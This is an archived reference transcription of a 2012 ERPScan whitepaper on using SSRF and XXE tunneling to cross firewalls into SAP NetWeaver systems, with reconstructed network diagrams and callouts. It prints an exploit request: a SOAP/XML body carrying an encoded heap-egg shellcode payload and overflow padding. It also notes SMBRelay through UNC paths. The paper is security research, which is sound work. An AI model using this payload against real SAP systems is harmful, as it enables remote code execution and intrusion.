...
tags: [whitepaper, webseclist-reference, erpscan, ssrf, xxe, attack-chain, rce, java, auth-bypass, injection, owasp-a01-2021, owasp-a03-2021, owasp-a10-2021]
generated:
  by: webseclist-refs/1
  at: "2026-09-09T22:47:09+00:00"
status: stable
...
cited_by:
  - "2012.md:6"
commit: ""
content_sha256: 0cde7087c876bf0cf9b012be9d4088fdbd581b926d23641d9fabf67f7830f088
depth: full
...
retrieved_utc: "2026-09-09T22:47:09+00:00"
slug: erpscan-ssrf-vs-business-critical-applications-part-1-xxe-tunneling-whitepaper
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
...
# SSRF vs. Business-critical applications. Part 1: XXE Tunneling in SAP NetWeaver (Whitepaper)

**SSRF vs. Business-critical applications. Part 1: XXE Tunneling in SAP NetWeaver (Whitepaper)** - Alexander Polyakov, Dmitry Chastukhin, Alexey Tyurin, ERPScan.
...
- Preserved from: https://web.archive.org/web/20170903113359/http://media.blackhat.com/bh-us-12/Briefings/Polyakov/BH_US_12_Polyakov_SSRF_Business_WP.pdf (manual-import) on 2026-09-09
- Licence: unknown
...
[Editorial reconstruction of the graphical relationships shown above; descriptive icon labels are editorial.]

```mermaid
flowchart LR
  subgraph C["Corporate network"]
    PCs["Six desktop computers"]
  end
  subgraph E["ERP network"]
    ERP["ERP server"]
  end
  subgraph I["Industrial network"]
    PLC["PLC"]
  end
  PCs <-->|"Firewall boundary"| ERP
  ERP <-->|"Firewall boundary"| PLC
```

--- page 9 ---

[Editorial transcription note: this callout is displaced above the body in the original PDF; text recovered from its text layer and visible lettering.]

> The idea of the research is to show a different approach to bypassing security mechanisms, firewalls and potential intrusion detection systems with the help of SSRF
...
```mermaid
flowchart LR
  Outside["External request"] --> Block["Direct route blocked at firewall"]
  Outside --> C["Corporate network server · 192.168.0.1"]
  C -->|"Request relayed across firewall"| H["HTTP Server · 172.16.0. [label clipped in original]"]
```
...
[Editorial transcription note: the following callout is displaced across the original page header.]

> SMBRelay attack is possible from anywhere if you can call something from a remote path like \\172.16.0.1\file. However, you need to have access to corporate network.
...
[Full-page diagram, landscape. A user at a workstation sends "Packet A" (drawn as a green rounded box containing a smaller red box) to a server labelled 192.168.0.1, titled at the top "Server A (Portal or XI)". A green/red shape sits on a brick wall (firewall) in the middle of the picture; a red inner packet — a label partly hidden behind the server graphic reads "Packet B [completed from the PDF text layer]" — passes through it. A red arrow continues from the wall to a second server on the right labelled 172.16.0.1 with a red explosion burst on it, captioned "Server B (ERP, HR, BW etc.)". Both servers are drawn with lightning-bolt symbols.]

[Editorial reconstruction of the graphical relationships shown above; descriptive icon labels are editorial.]

```mermaid
flowchart LR
  U["User"] --> PA["Packet A"] --> A["Server A (Portal or XI) · 192.168.0.1"]
  A <--> PB["Packet B · crosses firewall"]
  PB <--> B["Server B (ERP, HR, BW etc.) · 172.16.0.1 · exploit"]
```
...
[Editorial transcription note: the request is displaced across the original page header. The full text is recovered from the PDF text layer; printed line wraps are preserved, including wraps within XML names and numeric character references.]
...
xmlns:m="urn:sap-
com:document:sap:rfc:functions"><HEAP_EGG>dsecdsechffffk4diFkDwj02Dwk0D7AuEE4y4O3f2s3a064M7n2M0e
0P2N5k054N4r4n0G4z3c4M3O4o8M4q0F3417005O1n7L3m0Z0O0J4l8O0j0y7L5m3E2r0b0m0E1O4w0Z3z3B4Z0r
...

aaaaaaaaaaaaaaaaaaa</HEAP_EGG><NAME>&#186;&#255;&#255;&#206;&#060;&#102;&#129;&#202;&#255;&
#015;&#066;&#082;&#106;&#067;&#088;&#205;&#046;&#060;&#005;&#090;&#116;&#239;&#184;&#100;&#
115;&#101;&#099;&#139;&#250;&#175;&#117;&#234;&#175;&#117;&#231;&#255;&#231;&#144;&#144;&#1
44;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#158;&#14;&#190;&#
171;DSEC&#094;&#023;&#011;&#001;&#252;&#049;&#043;&#001;&#212;&#083;&#242;&#000;&#018;&#058;
&#071;&#000;&#250;&#047;&#057;&#016;&#076;&#255;&#084;&#000;&#001;&#002;&#000;&#000;&#226;&
#020;&#095;&#000;&#064;&#000;&#000;&#000;&#097;&#125;&#088;&#016;&#115;&#167;&#113;&#002;&#
117;&#218;&#157;&#000;&#004;&#128;&#069;&#000;&#082;&#089;&#012;&#016;&#235;&#004;&#235;&#0
02;&#134;&#027;&#198;&#000;&#255;&#255;&#233;&#077;&#255;&#255;&#255;&#255;AAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</NAME></m:RSPO_R_SAP
GPARAM></SOAP-ENV:Body></SOAP-ENV:Envelope>
```
...
[Editorial transcription note: the following callout is displaced across the original page heading.]

> “Let’s put it under the firewall” is not a solution anymore.
